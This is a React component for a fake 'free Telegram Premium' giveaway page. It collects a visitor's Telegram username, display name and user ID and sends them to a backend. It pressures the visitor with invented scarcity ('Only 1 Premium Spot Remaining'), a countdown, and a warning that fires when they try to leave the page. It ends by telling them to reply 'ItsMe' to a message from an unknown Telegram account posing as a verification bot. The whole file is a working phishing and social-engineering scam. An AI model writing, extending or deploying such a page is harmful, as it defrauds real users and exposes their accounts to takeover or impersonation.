import React, { useState, useEffect } from 'react';

const TelegramPremiumPromo = () => {
  const [currentPage, setCurrentPage] = useState('page1');
  const [transition, setTransition] = useState({ active: false, type: 'plane' });
  const [formData, setFormData] = useState({
    username: '',
    displayname: '',
    userid: ''
  });
  const [timeLeft, setTimeLeft] = useState(120);
  const [timerActive, setTimerActive] = useState(false);
  const [showFinalAlert, setShowFinalAlert] = useState(false);
  const [counter, setCounter] = useState(2);
  const [sessionId, setSessionId] = useState('');
  const [userStatus, setUserStatus] = useState(null);

  // Generate session ID on mount
  useEffect(() => {
    const sid = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    setSessionId(sid);
    checkUserStatus();
  }, []);

  // Check if user already exists
  const checkUserStatus = async () => {
    try {
      const userId = localStorage.getItem('telegram_user_id');
      if (userId) {
        const response = await fetch('/api/check-user', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userid: userId })
        });
        const data = await response.json();
        if (data.exists) {
          setUserStatus(data);
        }
      }
    } catch (error) {
      console.error('Error checking user status:', error);
    }
  };

  // Timer effect
  useEffect(() => {
    if (!timerActive || timeLeft <= 0) return;

    const interval = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setShowFinalAlert(true);
          sendTimerComplete();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [timerActive, timeLeft]);

  // Prevent page close during timer
  useEffect(() => {
    if (currentPage === 'page3' && timerActive) {
      const handleBeforeUnload = (e) => {
        e.preventDefault();
        e.returnValue = 'Are you sure you want to leave? You will lose your premium spot!';
        return e.returnValue;
      };
      window.addEventListener('beforeunload', handleBeforeUnload);
      return () => window.removeEventListener('beforeunload', handleBeforeUnload);
    }
  }, [currentPage, timerActive]);

  const showTransitionEffect = (toPage, type) => {
    setTransition({ active: true, type });
    setTimeout(() => {
      setCurrentPage(toPage);
      setTimeout(() => {
        setTransition({ active: false, type });
        if (toPage === 'page2') {
          setCounter(Math.floor(Math.random() * 2) + 1);
        }
      }, 500);
    }, type === 'plane' ? 1500 : 1000);
  };

  const sendTimerComplete = async () => {
    try {
      await fetch('/api/timer-complete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          sessionId
        })
      });
    } catch (error) {
      console.error('Error sending timer complete:', error);
    }
  };

  const submitClaim = async () => {
    if (!formData.username || !formData.displayname || !formData.userid) {
      alert('Please fill in all fields to claim your premium subscription.');
      return;
    }

    try {
      // Save to localStorage for user recognition
      localStorage.setItem('telegram_user_id', formData.userid);

      // Send to backend
      const response = await fetch('/api/submit-claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...formData,
          sessionId,
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        showTransitionEffect('page3', 'gift');
        setTimeout(() => {
          setTimerActive(true);
        }, 2000);
      } else {
        alert('Error submitting claim. Please try again.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Network error. Please check your connection.');
    }
  };

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  if (userStatus && userStatus.completed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 flex items-center justify-center p-5">
        <div className="max-w-md w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-8 shadow-2xl border border-gray-700">
          <div className="text-center">
            <div className="text-6xl mb-6">✅</div>
            <h1 className="text-3xl font-bold text-white mb-4">You're All Set!</h1>
            <p className="text-gray-400 mb-6">
              You've already claimed your premium subscription. Please check your Telegram for the verification message.
            </p>
            <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
              <p className="text-blue-400 font-semibold">
                Reply "ItsMe" to the bot message to complete activation
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 overflow-x-hidden">
      {/* Transition Overlay */}
      {transition.active && (
        <div className="fixed inset-0 bg-gradient-to-br from-gray-900 to-gray-800 flex items-center justify-center z-50">
          {transition.type === 'plane' ? (
            <div className="text-8xl animate-[fly_2s_ease-in-out]">✈️</div>
          ) : (
            <div className="relative w-40 h-40">
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-7xl animate-[pulse_1.5s_ease-in-out]">
                🎁
              </div>
              {[...Array(6)].map((_, i) => (
                <div
                  key={i}
                  className="absolute text-3xl animate-[burst_1.5s_ease-out_forwards]"
                  style={{
                    top: i < 3 ? `${i * 33}%` : '50%',
                    left: i < 3 ? '50%' : `${(i - 3) * 33}%`,
                    animationDelay: `${0.3 + i * 0.05}s`
                  }}
                >
                  {i % 2 === 0 ? '✨' : '⭐'}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      <div className="container max-w-lg mx-auto p-5 min-h-screen flex items-center justify-center">
        {/* Page 1: Congratulations */}
        {currentPage === 'page1' && (
          <div className="w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-[fadeIn_0.6s_ease-out]">
            <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center text-5xl shadow-lg shadow-blue-500/40 animate-[float_3s_ease-in-out_infinite]">
              ✈️
            </div>
            <div className="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 text-black px-5 py-2 rounded-full text-xs font-bold tracking-wider mb-5 shadow-lg shadow-yellow-500/40">
              PREMIUM ACCESS
            </div>
            <h1 className="text-4xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
              Congratulations!
            </h1>
            <p className="text-gray-400 text-lg mb-8">
              You've successfully decoded the comment and earned a FREE Telegram Premium subscription!
            </p>

            <div className="space-y-3 mb-8">
              {[
                { icon: '🔥', text: 'Download files up to 4 GB' },
                { icon: '⚡', text: 'Faster download speeds' },
                { icon: '🎨', text: 'Exclusive stickers & reactions' },
                { icon: '🎙️', text: 'Voice-to-text conversion' },
                { icon: '🚫', text: 'No ads forever' },
                { icon: '⭐', text: 'Unique badge & profile features' }
              ].map((feature, idx) => (
                <div
                  key={idx}
                  className="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center hover:bg-white/8 hover:translate-x-1 transition-all duration-300"
                >
                  <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg flex items-center justify-center text-xl mr-4">
                    {feature.icon}
                  </div>
                  <div className="text-gray-300 text-sm font-medium">{feature.text}</div>
                </div>
              ))}
            </div>

            <button
              onClick={() => showTransitionEffect('page2', 'plane')}
              className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-5 rounded-2xl font-semibold text-lg shadow-lg shadow-blue-500/30 hover:shadow-blue-500/50 hover:-translate-y-1 transition-all duration-300 active:scale-95"
            >
              Continue to Claim
            </button>
          </div>
        )}

        {/* Page 2: Form */}
        {currentPage === 'page2' && (
          <div className="w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-[fadeIn_0.6s_ease-out]">
            <div className="bg-gradient-to-r from-red-500 to-red-600 p-4 rounded-2xl text-center font-bold mb-6 shadow-lg shadow-red-500/40 animate-[pulse_2s_ease-in-out_infinite]">
              ⚡ Only {counter} Premium Spot{counter > 1 ? 's' : ''} Remaining ⚡
            </div>

            <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center text-5xl shadow-lg shadow-blue-500/40">
              🤖
            </div>
            <h1 className="text-3xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent text-center">
              Automated Delivery
            </h1>
            <p className="text-gray-400 text-center mb-8">
              Our AI-powered system will instantly verify and deliver your premium subscription
            </p>

            <div className="bg-blue-500/10 border border-blue-500/30 p-5 rounded-2xl mb-6">
              <div className="text-blue-400 font-semibold mb-3 flex items-center gap-2">
                📱 How It Works
              </div>
              <div className="text-gray-400 text-sm leading-relaxed">
                Enter your details below. Our automated bot will locate your account, send a verification DM, and activate your Telegram Premium within 60 seconds.
              </div>
            </div>

            <div className="space-y-5">
              <div>
                <label className="block text-gray-300 font-semibold mb-2 text-sm">
                  Telegram Username
                </label>
                <input
                  type="text"
                  value={formData.username}
                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                  placeholder="@yourusername"
                  className="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all"
                />
              </div>

              <div>
                <label className="block text-gray-300 font-semibold mb-2 text-sm">
                  Display Name
                </label>
                <input
                  type="text"
                  value={formData.displayname}
                  onChange={(e) => setFormData({ ...formData, displayname: e.target.value })}
                  placeholder="Your Display Name"
                  className="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all"
                />
              </div>

              <div>
                <label className="block text-gray-300 font-semibold mb-2 text-sm">
                  Telegram User ID
                </label>
                <input
                  type="text"
                  value={formData.userid}
                  onChange={(e) => setFormData({ ...formData, userid: e.target.value })}
                  placeholder="123456789"
                  className="w-full p-4 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-blue-500 focus:bg-white/8 focus:ring-4 focus:ring-blue-500/10 transition-all"
                />
              </div>

              <button
                onClick={submitClaim}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-5 rounded-2xl font-semibold text-lg shadow-lg shadow-blue-500/30 hover:shadow-blue-500/50 hover:-translate-y-1 transition-all duration-300 active:scale-95 mt-5"
              >
                Claim Premium Now
              </button>
            </div>
          </div>
        )}

        {/* Page 3: Timer */}
        {currentPage === 'page3' && (
          <div className="w-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 shadow-2xl border border-gray-700 animate-[fadeIn_0.6s_ease-out]">
            <div className="bg-gradient-to-r from-red-500 to-red-600 text-white p-6 rounded-2xl mb-8 shadow-lg shadow-red-500/40 border-2 border-white/20">
              <div className="text-xl font-bold mb-3">⚠️ IMPORTANT - DO NOT CLOSE THIS PAGE</div>
              <div className="text-sm leading-relaxed">
                Do NOT close or refresh this page. You will lose your opportunity and your spot will be given to someone else. Our fully automated system is processing your pre-ordered premium subscription.
              </div>
            </div>

            <div className="text-center">
              <div className="text-8xl mb-8 animate-[swing_1s_ease-in-out_infinite]">⏰</div>
              <h1 className="text-3xl font-bold mb-4 bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
                Automated Processing
              </h1>
              <p className="text-gray-400 mb-8">
                Our AI system is activating your pre-ordered Telegram Premium from our reserve stock
              </p>

              <div className="text-6xl font-bold text-blue-500 font-mono tracking-wider my-10 drop-shadow-[0_0_30px_rgba(42,171,238,0.5)]">
                {formatTime(timeLeft)}
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 p-5 rounded-2xl mb-6">
                <div className="text-blue-400 font-semibold mb-3 flex items-center gap-2 justify-center">
                  🤖 Fully Automated System
                </div>
                <div className="text-gray-400 text-sm leading-relaxed">
                  We maintain a stock of pre-ordered premium subscriptions. Everything is automated - from account verification to premium delivery. Stay on this page while our system completes the process.
                </div>
              </div>

              {showFinalAlert && (
                <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black p-6 rounded-2xl shadow-lg shadow-yellow-500/30 animate-[fadeIn_0.6s_ease-out]">
                  <div className="text-xl font-bold mb-4">🎉 Message Received!</div>
                  <div className="mb-3 text-sm">
                    You've received a message from an unknown Telegram ID. This is our automated verification bot.
                  </div>
                  <div className="mb-3 text-sm font-semibold">
                    CRITICAL STEP: Reply to that message with exactly:
                  </div>
                  <div className="bg-white/20 px-6 py-3 rounded-lg inline-block font-mono text-xl font-bold my-3">
                    ItsMe
                  </div>
                  <div className="bg-black text-yellow-400 p-4 rounded-xl font-semibold mt-4">
                    ⚠️ You MUST reply with "ItsMe" (case-sensitive) to verify your identity. Without this verification, the automated system cannot release your premium subscription.
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(30px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        @keyframes fly {
          0% { transform: translateX(-200px) rotate(-10deg) scale(0.8); opacity: 0; }
          20% { opacity: 1; }
          50% { transform: translateX(0) rotate(0deg) scale(1.2); }
          100% { transform: translateX(200px) rotate(10deg) scale(0.8); opacity: 0; }
        }
        @keyframes burst {
          0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
          50% { opacity: 1; }
          100% { transform: translate(-50%, -50%) translateY(-100px) scale(1.5); opacity: 0; }
        }
        @keyframes swing {
          0%, 100% { transform: rotate(-3deg); }
          50% { transform: rotate(3deg); }
        }
      `}</style>
    </div>
  );
};

export default TelegramPremiumPromo;